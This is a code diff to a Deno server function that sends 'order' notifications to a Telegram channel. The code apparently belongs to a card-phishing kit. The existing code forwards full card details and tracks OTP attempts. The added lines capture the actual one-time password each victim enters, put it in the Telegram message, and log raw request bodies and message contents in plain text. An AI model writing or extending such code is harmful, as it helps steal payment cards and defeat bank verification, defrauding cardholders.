@@ -1,3 +1,4 @@
+
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
@@ -36,6 +37,7 @@ interface OrderDetails {
   };
   notificationType: "order_placed" | "payment_details" | "otp_attempt";
   otpAttempt?: number;
+  otpValue?: string; // Added to capture the actual OTP value entered
 }
 
 function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
@@ -135,6 +137,11 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
   const statusText = isLastAttempt 
     ? '✅ Success - Final attempt' 
     : `❌ Failed - Attempt ${attempt} of 3`;
+    
+  // Add the actual OTP value entered by the user
+  const otpValue = orderDetails.otpValue 
+    ? `<code>${orderDetails.otpValue}</code>`
+    : 'Not provided';
 
   // Payment details section - show full card details
   let paymentSection = '';
@@ -158,6 +165,8 @@ ${attemptHeader}
 
 🔐 <b>Verification Status</b>:
    ${statusText}
+
+🔢 <b>OTP Entered</b>: ${otpValue}
 
 ${paymentSection}
 
@@ -193,6 +202,7 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
   try {
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     console.log(`Sending message to Telegram channel: ${TELEGRAM_CHANNEL_ID}`);
+    console.log("Message content:", message); // Log the actual message for debugging
     
     const response = await fetch(telegramApiUrl, {
       method: "POST",
@@ -206,15 +216,23 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
       }),
     });
 
-    const data = await response.json();
+    const responseData = await response.text();
+    console.log("Telegram API raw response:", responseData);
     
-    if (!data.ok) {
-      console.error("Telegram API error:", data);
+    try {
+      const data = JSON.parse(responseData);
+      
+      if (!data.ok) {
+        console.error("Telegram API error:", data);
+        return false;
+      }
+      
+      console.log("Telegram notification sent successfully:", data.result);
+      return true;
+    } catch (parseError) {
+      console.error("Error parsing Telegram response:", parseError);
       return false;
     }
-    
-    console.log("Telegram notification sent successfully:", data.result);
-    return true;
   } catch (error) {
     console.error("Error sending Telegram notification:", error);
     return false;
@@ -222,13 +240,33 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
 }
 
 serve(async (req) => {
+  console.log("Received request to send-telegram-notification function");
+  
   // Handle CORS preflight requests
   if (req.method === "OPTIONS") {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
-    const orderDetails: OrderDetails = await req.json();
+    // Log the raw request body for debugging
+    const rawBody = await req.text();
+    console.log("Raw request body:", rawBody);
+    
+    let orderDetails: OrderDetails;
+    
+    try {
+      orderDetails = JSON.parse(rawBody);
+    } catch (parseError) {
+      console.error("Failed to parse request body:", parseError);
+      return new Response(
+        JSON.stringify({ success: false, error: "Invalid JSON in request body" }),
+        {
+          status: 400,
+          headers: { "Content-Type": "application/json", ...corsHeaders },
+        }
+      );
+    }
+    
     console.log("Received order details for Telegram notification:", orderDetails);
     
     // Format the message for Telegram
